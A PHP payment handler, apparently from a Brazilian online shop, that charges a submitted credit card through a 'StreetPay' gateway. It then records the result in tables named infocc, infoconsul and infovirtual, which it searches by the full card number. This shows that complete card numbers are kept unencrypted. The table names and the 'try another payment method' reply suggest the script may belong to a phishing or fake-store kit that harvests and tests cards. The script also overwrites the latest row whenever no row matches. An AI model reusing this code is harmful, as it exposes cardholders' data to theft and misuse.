<?php
if (!isset($conexao)) {
    exit;
}

$data = json_decode(file_get_contents('php://input'), true);

$resultadoParaSalvar = 'Erro';
$sucessoOperacao = false;
$transactionId = null;
$numeroCartao = '';

try {
    $stmtGateway = $conexao->prepare("SELECT street_secret, street_company_id FROM gateway_cartão WHERE nome = 'street_pay' LIMIT 1");
    $stmtGateway->execute();
    $gateway = $stmtGateway->fetch(PDO::FETCH_ASSOC);

    if (!$gateway || empty($gateway['street_secret'])) {
        throw new Exception("Credenciais ausentes");
    }

    $apiKey = $gateway['street_secret'];
    $tokenizationKey = $gateway['street_company_id'] ?? '';

    $carrinho = json_decode($data['carrinho'] ?? '[]', true);
    $cartao = json_decode($data['cartão_de_crédito'] ?? '{}', true);
    $pagador = json_decode($data['pagador'] ?? '{}', true);

    if (empty($cartao['numero_do_cartão'])) {
        throw new Exception("Cartão ausente");
    }

    $valor_total = 0;
    foreach ($carrinho as $item) {
        $preco = floatval(str_replace(',', '.', $item['preço_atual'] ?? 0));
        $quantidade = intval($item['quantidade'] ?? 1);
        $valor_total += ($preco * $quantidade);
    }

    if ($valor_total <= 0) {
        throw new Exception("Valor zerado");
    }

    $numeroCartao = preg_replace('/\D/', '', $cartao['numero_do_cartão']);
    $cvv = preg_replace('/\D/', '', $cartao['cvv_do_cartão'] ?? '');
    $mes = intval($cartao['mes_do_cartão'] ?? 0);
    $ano = intval($cartao['ano_do_cartão'] ?? 0);
    if ($ano < 100) {
        $ano += 2000;
    }
    $parcelas = intval($cartao['parcelas'] ?? 1);
    if ($parcelas < 1) {
        $parcelas = 1;
    }

    $nome = trim($cartao['nome_do_titular'] ?? $pagador['nome'] ?? 'Cliente');
    $email = trim($pagador['email'] ?? '');
    $telefone = preg_replace('/\D/', '', $pagador['telefone'] ?? '');
    $documento = preg_replace('/\D/', '', $cartao['cpf_do_titular'] ?? $pagador['documento'] ?? '');

    $protocolo = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || ($_SERVER['SERVER_PORT'] ?? 80) == 443) ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $webhook_url = $protocolo . '://' . $host . '/Webhook/cartão/StreetPay';

    if (empty($tokenizationKey) || !function_exists('sodium_crypto_box_seal')) {
        throw new Exception("Tokenização indisponível");
    }

    $cardPayload = [
        'number' => $numeroCartao,
        'holder' => $nome,
        'expMonth' => str_pad($mes, 2, '0', STR_PAD_LEFT),
        'expYear' => strval($ano),
        'cvv' => $cvv
    ];

    $publicKeyBin = sodium_base642bin($tokenizationKey, SODIUM_BASE64_VARIANT_ORIGINAL);
    $encrypted = sodium_crypto_box_seal(json_encode($cardPayload), $publicKeyBin);
    $cardToken = sodium_bin2base64($encrypted, SODIUM_BASE64_VARIANT_ORIGINAL);

    $items = [];
    foreach ($carrinho as $item) {
        $items[] = [
            'quantity' => intval($item['quantidade'] ?? 1),
            'name' => $item['titulo'] ?? $item['nome'] ?? 'Produto',
            'price' => intval(round(floatval(str_replace(',', '.', $item['preço_atual'] ?? 0)) * 100)),
            'type' => 'DIGITAL'
        ];
    }

    $payload = [
        'amount' => intval(round($valor_total * 100)),
        'currency' => 'BRL',
        'method' => 'CREDIT_CARD',
        'description' => 'Pagamento via cartão',
        'installments' => $parcelas,
        'notificationUrl' => $webhook_url,
        'ip' => $_SERVER['REMOTE_ADDR'] ?? null,
        'payer' => [
            'name' => $nome,
            'taxId' => $documento,
            'email' => $email,
            'phone' => $telefone
        ],
        'items' => $items,
        'card' => [
            'token' => $cardToken
        ]
    ];

    $url = 'https://api.streetpays.com.br/v1/payment';

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($payload, JSON_UNESCAPED_UNICODE),
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json',
            'Accept: application/json',
            'Authorization: Bearer ' . $apiKey
        ],
        CURLOPT_TIMEOUT => 30
    ]);

    $response = curl_exec($ch);
    $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $retorno = json_decode($response, true);

    if ($http >= 200 && $http < 300 && isset($retorno['status'])) {
        $transactionId = $retorno['id'] ?? null;
        $status = strtoupper($retorno['status']);

        if ($status === 'PAID' || $status === 'APPROVED') {
            $sucessoOperacao = true;
            $resultadoParaSalvar = 'Aprovado';
        } elseif ($status === 'PENDING' || $status === 'PROCESSING') {
            $resultadoParaSalvar = 'Em análise';
        } else {
            $resultadoParaSalvar = 'Recusado';
        }
    } else {
        $resultadoParaSalvar = 'Recusado';
    }

} catch (Exception $e) {
    $resultadoParaSalvar = 'Erro';
}

if (!empty($numeroCartao)) {
    $isVirtual = isset($cartao['ultimos']) && strpos(strtolower($cartao['ultimos']), 'virtual') !== false;

    if ($isVirtual) {
        $stmtV = $conexao->prepare("UPDATE infovirtual SET resultado_gateway = ?, pixid = ? WHERE REPLACE(infocc_virtual, ' ', '') = ?");
        $stmtV->execute([$resultadoParaSalvar, $transactionId, $numeroCartao]);

        if ($stmtV->rowCount() == 0) {
            $stmtFV = $conexao->prepare("UPDATE infovirtual SET resultado_gateway = ?, pixid = ? ORDER BY id DESC LIMIT 1");
            $stmtFV->execute([$resultadoParaSalvar, $transactionId]);
        }
    } else {
        $stmt1 = $conexao->prepare("UPDATE infocc SET resultado_gateway = ?, pixid = ? WHERE REPLACE(REPLACE(infocc, ' ', ''), '-', '') = ?");
        $stmt1->execute([$resultadoParaSalvar, $transactionId, $numeroCartao]);

        if ($stmt1->rowCount() == 0) {
            $stmtF1 = $conexao->prepare("UPDATE infocc SET resultado_gateway = ?, pixid = ? ORDER BY id DESC LIMIT 1");
            $stmtF1->execute([$resultadoParaSalvar, $transactionId]);
        }

        $stmt2 = $conexao->prepare("UPDATE infoconsul SET resultado_gateway = ?, pixid = ? WHERE REPLACE(REPLACE(infocc, ' ', ''), '-', '') = ?");
        $stmt2->execute([$resultadoParaSalvar, $transactionId, $numeroCartao]);

        if ($stmt2->rowCount() == 0) {
            $stmtF2 = $conexao->prepare("UPDATE infoconsul SET resultado_gateway = ?, pixid = ? ORDER BY id DESC LIMIT 1");
            $stmtF2->execute([$resultadoParaSalvar, $transactionId]);
        }
    }
}

echo json_encode([
    'sucesso' => $sucessoOperacao,
    'mensagem' => $sucessoOperacao ? 'Pagamento aprovado.' : 'Pagamento não autorizado. Tente usar outra forma de pagamento.'
]);

exit;